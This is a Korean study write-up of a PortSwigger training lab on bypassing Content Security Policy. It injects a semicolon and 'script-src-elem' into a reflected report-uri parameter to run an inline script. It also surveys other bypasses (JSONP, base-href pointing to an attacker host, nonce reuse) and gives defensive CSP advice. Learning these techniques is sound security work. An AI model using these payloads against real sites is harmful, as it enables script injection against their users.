# Lab: Reflected XSS protected by CSP, with CSP bypass

## 개요

- **난이도**: Expert
- **주제**: Cross-Site Scripting (XSS) — CSP 헤더 인젝션 / `report-uri` 파라미터 반영 / `script-src-elem` 디렉티브 주입
- **링크**: https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass

## 목표

CSP가 인라인 스크립트를 차단하고 있지만, `report-uri` 에 반영되는 URL 파라미터에 세미콜론을 주입해 CSP 헤더 자체를 조작하고 인라인 스크립트 실행을 허용하도록 변경하여 `alert()` 를 실행시킨다.

## 서버의 CSP 헤더

```
Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self'; style-src 'self'; report-uri /csp-report?token=USER_INPUT
```

`token` 파라미터 값이 CSP 헤더의 `report-uri` 값 뒤에 그대로 반영된다.

## 최종 페이로드

```
?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```

### 생성되는 CSP 헤더

```
Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self'; style-src 'self'; report-uri /csp-report?token=;script-src-elem 'unsafe-inline'
```

`;` 가 `report-uri` 디렉티브를 종료하고 새 디렉티브 `script-src-elem 'unsafe-inline'` 이 추가된다.

## 단계별 분해 분석

### 1단계: 취약점 발견 — CSP 헤더에 파라미터 반영 확인

```
HTTP 요청:
  GET /?search=hello&token=TEST

HTTP 응답 헤더:
  Content-Security-Policy: ...report-uri /csp-report?token=TEST
                                                              ↑
                                            token 값이 CSP 헤더에 그대로 반영됨
```

이것이 사용된다는 것을 파악하기 어려운 이유:
- 취약점이 HTML 본문이 아닌 **HTTP 응답 헤더**에 있음
- 브라우저 개발자 도구 → Network 탭 → 응답 헤더를 직접 확인해야 발견 가능
- 일반적인 XSS 탐색(HTML 소스 검사)으로는 보이지 않음

### 2단계: 세미콜론 주입 — CSP 디렉티브 추가

```
token 에 입력: ;script-src-elem 'unsafe-inline'

CSP 헤더 변환:
  ...report-uri /csp-report?token= ; script-src-elem 'unsafe-inline'
                                    ↑
                              ; 가 report-uri 종료 → 새 디렉티브 시작
```

**CSP 파싱 규칙**:

```
Content-Security-Policy: dirA value; dirB value; dirC value
                                    ↑           ↑
                              세미콜론이 각 디렉티브를 구분

→ 헤더 값 중간에 ; 를 삽입하면 새 디렉티브로 인식됨
```

### 3단계: `script-src-elem` — `script-src` 를 덮어쓰는 특수 디렉티브

```
원래 CSP:
  script-src 'self'          → <script src="..."> 와 인라인 스크립트 모두 제어

주입한 디렉티브:
  script-src-elem 'unsafe-inline'  → <script> 요소만 별도로 제어

브라우저 우선순위:
  script-src-elem 이 있으면 script-src 보다 더 구체적인 규칙으로 적용
  → script-src 'self' 가 있어도 script-src-elem 'unsafe-inline' 이 우선
  → <script>alert(1)</script> 실행 허용!
```

### 4단계: XSS 페이로드 삽입

```
search 파라미터에: <script>alert(1)</script>
token 파라미터에:  ;script-src-elem 'unsafe-inline'

최종 요청:
  GET /?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```

```
결과:
  1. CSP 헤더에 script-src-elem 'unsafe-inline' 추가됨
  2. 인라인 <script> 실행 허용됨
  3. <script>alert(1)</script> 실행!
```

## 왜 파악하기 어려운가

```
일반적인 XSS 탐색 순서:
  1. 입력값이 HTML에 어디에 반영되는가? → HTML 소스 확인
  2. 어떤 문자가 필터링되는가? → ' " < > 등 확인
  3. 컨텍스트는? → 태그 사이 / 속성 / JS / ...

CSP 헤더 인젝션 탐색 요구사항:
  1. HTTP 응답 헤더까지 확인해야 함
  2. 어떤 파라미터가 헤더에 반영되는지 파악
  3. CSP 문법과 디렉티브 우선순위 지식 필요
  4. 개발자 도구 → Network → 응답 헤더 탭이 보통 간과됨

[탐색 도구]
  Burp Suite: Proxy → HTTP history → Response 탭에서 모든 헤더 확인 가능
  브라우저: F12 → Network → 응답 선택 → Headers 탭
```

## 핵심 정리

- CSP 헤더에 사용자 입력이 반영되면 헤더 자체를 조작할 수 있다.
- `report-uri` 값에 `;` 를 삽입하면 새로운 CSP 디렉티브를 추가할 수 있다.
- `script-src-elem` 은 `script-src` 보다 구체적인 규칙으로 우선 적용되어 기존 정책을 무력화한다.
- 이 취약점은 HTML이 아닌 HTTP 헤더에 있어 일반적인 XSS 탐색 방법으로는 찾기 어렵다.
- **방어**:
  - `report-uri` / `report-to` 에 사용자 입력을 절대 반영하지 않을 것
  - 파라미터를 헤더에 삽입할 때 세미콜론, 개행 문자 등을 철저히 필터링

## 배운 점 및 추가 학습

### 1. CSP 디렉티브 체계 전체

```
[로드 제어]
  default-src       — 모든 리소스 기본값
  script-src        — <script> 및 JS 이벤트 핸들러 전체
  script-src-elem   — <script> 요소만 (script-src 보다 구체적)
  script-src-attr   — 인라인 이벤트 핸들러만 (onclick 등)
  style-src         — <style>, <link rel=stylesheet>
  style-src-elem    — <style> 요소만
  style-src-attr    — style="" 속성만
  img-src           — <img>, CSS background 등
  connect-src       — fetch, XHR, WebSocket
  font-src          — @font-face
  media-src         — <audio>, <video>
  frame-src         — <iframe>
  object-src        — <object>, <embed>, <applet>
  worker-src        — Web Worker, Service Worker
  manifest-src      — Web App Manifest
  base-uri          — <base href> 제어
  form-action       — <form action> 제어

[보고]
  report-uri        — 위반 보고 URL (deprecated)
  report-to         — 위반 보고 그룹

[기타]
  upgrade-insecure-requests — HTTP → HTTPS 자동 업그레이드
  block-all-mixed-content   — 혼합 콘텐츠 차단
  sandbox               — iframe sandbox와 유사한 제한
```

### 2. 디렉티브 구체성(Specificity) 우선순위

```
script-src-elem > script-src > default-src
     ↑ 가장 구체적      ↑ 중간      ↑ 가장 일반

예:
  default-src 'none'
  script-src 'self'
  script-src-elem 'unsafe-inline'   ← 이것이 적용됨 (가장 구체적)

  → <script>alert(1)</script> 실행 허용
  → script-src 'self' 는 무시됨
```

### 3. CSP 값(Source List) 종류

```
'none'            — 아무것도 허용 안 함
'self'            — 같은 origin 만 허용
'unsafe-inline'   — 인라인 스크립트/스타일 허용 (위험)
'unsafe-eval'     — eval(), new Function() 허용 (위험)
'strict-dynamic'  — nonce/hash 로 허용된 스크립트가 로드하는 스크립트 허용
'nonce-BASE64'    — 특정 nonce 값을 가진 <script nonce="BASE64"> 만 허용
'sha256-HASH'     — 특정 내용의 인라인 스크립트만 허용 (해시 일치)
https:            — HTTPS 경유 모든 스크립트 허용
*.example.com     — 특정 도메인 허용

XSS 관련 위험 설정:
  'unsafe-inline' → 인라인 XSS 직접 허용
  'unsafe-eval'   → eval() 기반 공격 허용
  https:          → 공격자가 HTTPS 서버 보유 시 우회
  *.cdn.com       → 해당 CDN에 업로드 가능하면 우회
```

### 4. `report-uri` vs `report-to`

```
[report-uri — 구식, deprecated]
Content-Security-Policy: script-src 'self'; report-uri /csp-report

  → 위반 발생 시 /csp-report 로 JSON POST 요청
  → 값이 URL이므로 사용자 입력 반영 시 주입 가능

[report-to — 현대식]
Content-Security-Policy: script-src 'self'; report-to csp-endpoint
Reporting-Endpoints: csp-endpoint="https://example.com/csp-report"

  → 그룹 이름으로 분리되어 주입 어려움
  → 별도 Reporting-Endpoints 헤더에서 URL 정의
```

### 5. CSP 헤더 인젝션 탐색 방법

```
Burp Suite 활용:
  1. Proxy → HTTP history 에서 응답 헤더 확인
  2. Scanner: "Header injection" 항목 탐색
  3. Repeater 에서 파라미터 변경 후 헤더 변화 관찰

수동 탐색:
  1. 모든 URL 파라미터를 하나씩 변경
  2. 응답 헤더의 CSP 값 변화 확인
  3. 특히 report-uri, report-to 근처 반영 여부 체크

탐색 페이로드:
  token=CANARY_VALUE → 헤더에서 CANARY_VALUE 찾기
  token=;x=y         → CSP 파싱 오류 또는 새 디렉티브 추가 확인
```

### 6. 기타 CSP 우회 기법 정리

```
1. CSP 헤더 인젝션 (이번 랩)
   → report-uri 에 파라미터 반영 → ; 로 디렉티브 추가

2. JSONP 엔드포인트 (허용된 도메인에 JSONP가 있을 때)
   → script-src *.googleapis.com 이면 googleapis JSONP 악용 가능
   → <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)">

3. Angular + CDN 허용 (026 랩)
   → script-src ajax.googleapis.com → Angular ng-* 디렉티브 공격

4. Dangling Markup (029 랩)
   → 스크립트 없이 이미지 GET으로 데이터 유출

5. base-uri 미설정 + <base> 삽입
   → <base href="https://attacker.com/">
   → 이후 상대경로 스크립트 로드가 공격자 서버로 향함

6. nonce 예측/재사용
   → nonce 가 추측 가능하거나 매 요청마다 같으면 우회
   → <script nonce="KNOWN_VALUE">alert(1)</script>

7. script-src 도메인에 업로드 가능한 경우
   → 허용 도메인에 .js 파일 업로드 후 로드
   → CSP: script-src storage.example.com
   → <script src="https://storage.example.com/attacker-uploaded.js">
```

### 7. 올바른 CSP 설계 원칙

```
[나쁜 CSP]
Content-Security-Policy: script-src 'self' 'unsafe-inline' https:; report-uri /?token=USER_INPUT

문제:
  - 'unsafe-inline' → 인라인 스크립트 허용
  - https: → 모든 HTTPS 스크립트 허용
  - report-uri 에 사용자 입력 반영

[좋은 CSP]
Content-Security-Policy: default-src 'none'; script-src 'nonce-RANDOM_PER_REQUEST'; base-uri 'none'; form-action 'self'; report-to csp-endpoint

포인트:
  - default-src 'none' 으로 시작 (화이트리스트 방식)
  - nonce 를 요청마다 다르게 생성 (예측 불가)
  - base-uri 'none' 으로 <base> 삽입 차단
  - 사용자 입력을 헤더에 반영하지 않음
  - report-to 사용 (report-uri 대신)
```
